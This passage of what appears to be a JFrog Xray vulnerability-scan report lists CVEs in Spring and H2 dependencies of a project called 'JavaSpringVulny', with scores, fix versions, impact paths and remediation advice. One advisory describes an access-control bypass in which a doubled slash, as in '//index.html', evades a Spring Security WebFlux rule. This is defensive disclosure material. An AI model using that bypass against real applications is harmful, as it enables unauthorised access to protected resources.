                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-devtools:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.data:spring-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-expression:5.3.31"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-621625",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38808",
          "https://github.com/spring-projects/spring-framework/commit/f44d13cb7816e586b86c02421af4f5498391111c",
          "https://github.com/advisories/GHSA-9cmq-m9j5-mvww",
          "https://spring.io/security/cve-2024-38808",
          "https://security.netapp.com/advisory/ntap-20240920-0002/",
          "https://github.com/spring-projects/spring-framework/commit/26f2dad388499faecf99e75b8856788e95d8d658",
          "https://security.netapp.com/advisory/ntap-20240920-0002"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38821",
            "cvss_v3_score": "9.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "cwe": [
              "CWE-285",
              "CWE-770"
            ]
          }
        ],
        "summary": "Spring WebFlux applications that have Spring Security authorization rules on static resources can be bypassed under certain circumstances.\n\nFor this to impact an application, all of the following must be true:\n\n  *  It must be a WebFlux application\n  *  It must be using Spring's static resources support\n  *  It must have a non-permitAll authorization rule applied to the static resources support",
        "severity": "Critical",
        "components": {
          "gav://org.springframework.security:spring-security-web:5.7.11": {
            "fixed_versions": [
              "[5.7.13]",
              "[5.8.15]",
              "[6.0.13]",
              "[6.1.11]",
              "[6.2.7]",
              "[6.3.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-web:5.7.11"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-649210",
        "references": [
          "https://spring.io/security/cve-2024-38821",
          "https://github.com/spring-projects/spring-security/commit/4ce7cde15599c0447163fd46bac616e03318bf5b",
          "https://security.netapp.com/advisory/ntap-20250124-0006",
          "https://security.netapp.com/advisory/ntap-20250124-0006/",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38821",
          "https://github.com/spring-projects/spring-security/commit/0e257b56ce35402558a260ffa6b368982f9a7934",
          "https://github.com/advisories/GHSA-c4q5-6c82-3qpw"
        ],
        "extended_information": {
          "short_description": "A design problem in Spring Security may lead to filter bypass when using WebFlux and URL filters with static resources.",
          "full_description": "The [Spring Framework](https://spring.io/) is a widely used Java-based application framework that provides infrastructure support for the development of enterprise-level Java applications.\n[Spring WebFlux](https://docs.spring.io/spring-framework/reference/web/webflux.html) is a web framework included in the Spring Framework, it is a full replacement to the older [Spring Web MVC](https://docs.spring.io/spring-framework/reference/web/webmvc.html) framework.\n\nSpring Security is a powerful authentication and access control framework, and an industry standard in securing Spring-based applications. It provides both authentication and authorization and can be easily extended to meet custom requirements.\n\nThe `permitAll()` function is used in `Spring Security` configurations to indicate that all users, regardless of their authentication status, are allowed to access the specified resources or endpoints. A `non-permitAll` rule means a security configuration other than `permitAll()`, such as requiring authentication or specific roles (for example: `pathMatchers(\"/static/**\").authenticated()`).\n\nIt has been discovered that authorization rules on static resources can be bypassed under certain circumstances - when there is a `non-permitAll` authorization rule.\n\nFor example, a URL like `//index.html` can bypass a rule on `/index.html`, like in the following code snippet -\n\n```\n@Configuration\n@EnableWebFluxSecurity\nstatic class MultiSecurityHttpConfig {\n                                              \n    @Bean\n    SecurityWebFilterChain apiHttpSecurity(ServerHttpSecurity http) {\n        return http\n            .authorizeExchange { exchanges -\u003e\n                exchanges\n                    .pathMatchers(\"/index.html\", \"/secure/hello\", \"/application.yaml\").authenticated()\n                    .anyExchange().permitAll()\n            }\n            .httpBasic(Customizer.withDefaults())\n            .formLogin(Customizer.withDefaults())\n            .build()\n    }\n\n}\n```",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The application must have a non-permitAll authorization rule applied to a static resource.",
              "is_positive": true
            },
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "An attacker can simply surf to a URL and not be subjected to any intended access restrictions."
            },
            {
              "name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
              "description": "The security impact of this issue depends on the sensitivity of the specific resources that can be accessed while avoiding the access restrictions imposed by Spring Security.",
              "is_positive": true
            },
            {
              "name": "The issue can be exploited by attackers over the network"
            },
            {
              "name": "The issue has an exploit published",
              "description": "A PoC and technical write-up has been published."
            }
          ],
          "remediation": "##### Development mitigations\n\nConfigure Spring Security to adopt a `deny-by-default` approach. For example:\n```\nhttp\n.authorizeExchange(exchange -\u003e exchange\n\t.anyExchange().denyAll() // Deny all access by default\n\t.pathMatchers(\"/public/**\").permitAll() // Allow access to public endpoints\n\t.pathMatchers(\"/user/**\").authenticated() // Authenticate access to user endpoints\n)\n.httpBasic().and()\n.formLogin();\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-45868",
            "cvss_v3_score": "7.8",
            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-200",
              "CWE-312"
            ]
          }
        ],
        "summary": "The web-based admin console in H2 Database Engine before 2.2.220 can be started via the CLI with the argument -webAdminPassword, which allows the user to specify the password in cleartext for the web admin console. Consequently, a local user (or an attacker that has obtained local access through some means) would be able to discover the password by listing processes and their arguments. NOTE: the vendor states \"This is not a vulnerability of H2 Console ... Passwords should never be passed on the command line and every qualified DBA or system administrator is expected to know that.\" Nonetheless, the issue was fixed in 2.2.220.",
        "severity": "High",
        "components": {
          "gav://com.h2database:h2:2.1.214": {
            "fixed_versions": [
              "[2.2.220]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://com.h2database:h2:2.1.214"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-261922",
        "references": [
          "https://github.com/h2database/h2database/releases/tag/version-2.2.220",
          "https://github.com/h2database/h2database/issues/3686",
          "https://sites.google.com/sonatype.com/vulnerabilities/sonatype-2022-6243",
          "https://github.com/h2database/h2database/blob/96832bf5a97cdc0adc1f2066ed61c54990d66ab5/h2/src/main/org/h2/server/web/WebServer.java#L346-L347",
          "https://github.com/advisories/GHSA-22wj-vf5f-wrvj",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-45868",
          "https://github.com/h2database/h2database/commit/581ed18ff9d6b3761d851620ed88a3994a351a0d",
          "https://github.com/h2database/h2database/pull/3833"
        ],
        "extended_information": {
          "short_description": "(Non-issue) Incorrect usage of the H2 Database Engine may result in password leakage for the H2 Console.",
          "full_description": "[h2database](https://github.com/h2database/h2database) is an open-source lightweight Java Database. H2 Database supports standard database APIs such as SQL and JDBC API. The H2 Database can also be used in embedded and server modes. H2 Database has a web-based admin console that can be initialized via the CLI. The console is accessible via tool options that are declared by the H2 Database. \n\nThe H2 console supports the `-webAdminPassword` CLI argument which takes the web admin password as a value. Specifying this password in the CLI is unsafe since local attackers will be able to see the password in plain text when the process list is shown with the arguments used to run them.\n\nThis vulnerability is a non-issue since passing passwords via the CLI is a well-known bad practice, and does not relate specifically to the H2 Database Engine.",
          "jfrog_research_severity": "Low",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue has been disputed by the vendor",
              "description": "This vulnerability is a non-issue since passing passwords via the CLI is a well-known bad practice, and does not relate specifically to the H2 Database Engine.",
              "is_positive": true
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2025-22235",
            "cvss_v3_score": "7.3",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
            "cwe": [
              "CWE-862",
              "CWE-20"
            ]
          }
        ],
        "summary": "EndpointRequest.to() creates a matcher for null/** if the actuator endpoint, for which the EndpointRequest has been created, is disabled or not exposed.\n\nYour application may be affected by this if all the following conditions are met:\n\n  *  You use Spring Security\n  *  EndpointRequest.to() has been used in a Spring Security chain configuration\n  *  The endpoint which EndpointRequest references is disabled or not exposed via web\n  *  Your application handles requests to /null and this path needs protection\n\n\nYou are not affected if any of the following is true:\n\n  *  You don't use Spring Security\n  *  You don't use EndpointRequest.to()\n  *  The endpoint which EndpointRequest.to() refers to is enabled and is exposed\n  *  Your application does not handle requests to /null or this path does not need protection",
        "severity": "High",
        "components": {
          "gav://org.springframework.boot:spring-boot:2.7.18": {
            "fixed_versions": [
              "[3.3.11]",
              "[3.4.5]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-devtools:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-devtools:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-thymeleaf:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-695110",
        "references": [
          "https://security.netapp.com/advisory/ntap-20250516-0010",
          "https://github.com/advisories/GHSA-rc42-6c7j-7h5r",
          "https://nvd.nist.gov/vuln/detail/CVE-2025-22235",
          "https://security.netapp.com/advisory/ntap-20250516-0010/",
          "https://spring.io/security/cve-2025-22235"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2025-22233",
            "cvss_v3_score": "3.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N",
            "cwe": [
              "CWE-20"
            ]
          }
        ],
        "summary": "CVE-2024-38820 ensured Locale-independent, lowercase conversion for both the configured disallowedFields patterns and for request parameter names. However, there are still cases where it is possible to bypass the disallowedFields checks.\n\nAffected Spring Products and Versions\n\nSpring Framework:\n  *  6.2.0 - 6.2.6\n\n  *  6.1.0 - 6.1.19\n\n  *  6.0.0 - 6.0.27\n\n  *  5.3.0 - 5.3.42\n  *  Older, unsupported versions are also affected\n\n\n\nMitigation\n\nUsers of affected versions should upgrade to the corresponding fixed version.\n\nAffected version(s)Fix Version Availability 6.2.x\n 6.2.7\nOSS6.1.x\n 6.1.20\nOSS6.0.x\n 6.0.28\n Commercial https://enterprise.spring.io/ 5.3.x\n 5.3.43\n Commercial https://enterprise.spring.io/ \nNo further mitigation steps are necessary.\n\n\nGenerally, we recommend using a dedicated model object with properties only for data binding, or using constructor binding since constructor arguments explicitly declare what to bind together with turning off setter binding through the declarativeBinding flag. See the Model Design section in the reference documentation.\n\nFor setting binding, prefer the use of allowedFields (an explicit list) over disallowedFields.\n\nCredit\n\nThis issue was responsibly reported by the TERASOLUNA Framework Development Team from NTT DATA Group Corporation.",
        "severity": "Low",
        "components": {
          "gav://org.springframework:spring-context:5.3.31": {
            "fixed_versions": [
              "[6.1.20]",
              "[6.2.7]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-devtools:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-devtools:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-aop:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-autoconfigure:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-jdbc:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.data:spring-data-jpa:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-context:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
